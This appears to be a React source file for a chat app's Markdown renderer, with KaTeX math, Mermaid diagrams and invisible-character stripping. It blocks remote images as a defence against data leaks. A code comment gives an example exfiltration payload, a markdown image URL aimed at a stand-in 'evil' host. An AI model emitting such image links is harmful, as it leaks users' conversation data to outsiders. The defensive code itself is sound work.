"use client";

import { isValidElement, type ReactElement } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import rehypeKatex from "rehype-katex";
import "katex/dist/katex.min.css";
import { Mermaid } from "./mermaid";
import { useT } from "@/i18n/client";
import { stripInvisible } from "@/lib/sanitize";

export function Markdown({ children, serif = false }: { children: string; serif?: boolean }) {
  const t = useT();
  return (
    <div className={serif ? "md md-serif" : "md"}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm, remarkMath]}
        rehypePlugins={[[rehypeKatex, { throwOnError: false, strict: "ignore" }]]}
        components={{
          // No remote images: a ![](https://evil/?d=...) would load and leak conversation data.
          img({ alt }) {
            return alt ? <span className="text-muted-foreground">{t.chat.imageAlt(alt)}</span> : null;
          },
          pre({ children, ...props }) {
            const child = children as ReactElement<{ className?: string; children?: unknown }>;
            if (isValidElement(child) && child.props.className?.includes("language-mermaid")) {
              return <Mermaid code={String(child.props.children ?? "").trim()} />;
            }
            return <pre {...props}>{children}</pre>;
          },
        }}
      >
        {stripInvisible(children)}
      </ReactMarkdown>
    </div>
  );
}
